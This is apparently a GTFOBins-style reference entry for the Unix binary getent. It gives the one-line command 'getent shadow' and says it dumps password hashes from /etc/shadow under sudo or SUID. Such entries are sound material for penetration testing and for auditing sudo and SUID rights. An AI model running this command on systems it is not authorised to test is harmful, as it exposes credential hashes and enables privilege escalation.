---
type: gtfobin
name: getent
platform: Unix
functions: [privilege-escalation]
tags: [gtfobin, unix, lotl]
---

# getent

## privilege-escalation

```bash
getent shadow
```
_This allows to dump password hashes from the `/etc/shadow` file._
**Contexts:** sudo, suid
